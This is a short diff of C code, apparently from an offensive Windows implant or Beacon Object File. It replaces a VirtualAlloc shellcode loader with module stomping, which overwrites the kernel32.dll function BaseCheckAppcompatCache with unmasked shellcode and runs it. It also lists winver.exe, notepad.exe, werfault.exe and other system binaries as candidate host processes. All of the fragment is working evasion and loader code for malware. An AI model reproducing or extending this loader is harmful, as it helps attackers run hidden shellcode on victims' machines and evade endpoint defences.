@@ -42,10 +42,13 @@ void go()
 
     SCW w;
     scw_init(&w, stub, sizeof(stub));
-    scw_load_and_call(&w,
-                      (u64)KERNEL32$VirtualAlloc,
-                      (u64)KERNEL32$VirtualProtect,
-                      (const u8 *)unmasked_sc, masked_sc->length);
+    // scw_load_and_call(&w,(u64)KERNEL32$VirtualAlloc,(u64)KERNEL32$VirtualProtect, (const u8 *)unmasked_sc, masked_sc->length);
+    /* TO DO: select a better module and fn for stomping */
+    scw_stomp_and_call(&w,
+                       (u64)KERNEL32$VirtualProtect,
+                       "kernel32.dll",
+                       "BaseCheckAppcompatCache",
+                       (const u8 *)unmasked_sc, masked_sc->length);
 
     dprintf("[+] stub: %d bytes, nulls: %s\n",
             w.len, scw_check_nulls(&w) == -1 ? "none" : "BUG");
@@ -56,7 +59,11 @@ void go()
         L'C', L':', L'\\',
         L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\',
         L'S', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\',
-        L'w', L'i', L'n', L'v', L'e', L'r', L'.', L'e', L'x', L'e',
+        L'w', L'i', L'n', L'v', L'e', L'r', L'.', L'e', L'x', L'e', // winver.exe
+        // L'n', L'o', L't', L'e', L'p', L'a', L'd', L'.', L'e', L'x', L'e', // notepad.exe
+        // L'w', L'e', L'r', L'f', L'a', L'u', L'l', L't', L'.', L'e', L'x', L'e', // werfault.exe
+        // L'x', L'w', L'i', L'z', L'a', L'r', L'd', L'.', L'e', L'x', L'e', // xwizard.exe
+        // L'c', L'o', L'l', L'o', L'r', L'c', L'p', L'l', L'.', L'e', L'x', L'e', // colorcpl.exe
         L'\0'};
 
     UNICODE_STRING imagePath = {
